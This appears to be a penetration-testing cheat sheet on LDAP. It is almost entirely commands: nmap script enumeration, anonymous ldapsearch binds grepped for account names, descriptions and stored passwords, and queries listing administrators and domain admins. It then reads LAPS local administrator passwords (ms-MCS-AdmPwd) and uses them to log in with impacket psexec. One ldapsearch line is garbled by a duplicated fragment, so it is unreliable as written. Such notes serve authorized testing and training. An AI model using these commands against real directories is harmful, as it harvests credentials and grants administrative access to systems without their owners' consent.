# LDAP

## Enumeration

```
nmap -n -sV --script "ldap* and not brute" <ip>  
```

### Empty login

Enumerate users and associated data. The description field may contain plaintext credentials.

<pre><code>ldapsearch -x -h &#x3C;ip> -D "" -w "" -b "DC=&#x3C;subdomain>,DC=&#x3C;tld>"

<strong>ldapsearch -x -h &#x3C;ip> -D "" -w "" -b "DC=&#x3C;subdomain>,DC=&#x3C;tld>" | grep sAMAccountName
</strong>ldapsearch -x -h &#x3C;ip> -D "" -w "" -b "DC=&#x3C;subdomain>,DC=&#x3C;tld>" | grep description
ldapsearch -x -h &#x3C;ip> -D "" -w "" -b "DC=&#x3C;subdomain>,DC=&#x3C;tld>" | grep userpas
</code></pre>

## Enumeration with credentials

```
ldapsearch -x -h <ip> -D '<domain>\<user>' -w '<pass>' -b "<CN string>,DC=<subdomain>,DC=<TLD>"sers,DC=<subdomain>,DC=<TLD>"
```

Set `CN string` to one of the following values:

* `CN=Users`: list all users
* `CN=Administrators,CN=Builtin`: list all administrators
* `CN=<username>,CN=Users`: get information about a specific user
* `CN=Domain Admins,CN=Users`: list domain admins
* `CN=Domain Users,CN=Users`: list domain users
* `CN=Enterprise Admins,CN=Users`: list enterprise admins
* `CN=Computers`: list machines

## Administrative password

Requires access to LDAP with a valid username and password.

```
ldapsearch -x -h <ip> -D '<domain>\<user>' -w '<pass>' -b "DC=<subdomain>,DC=<tld>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
```

If successful it is possible to login using impacket's psexec.py script. The user is usually the local administrator.

```
psexec.py <domain>/administrator:'<pass>'@<ip>
```
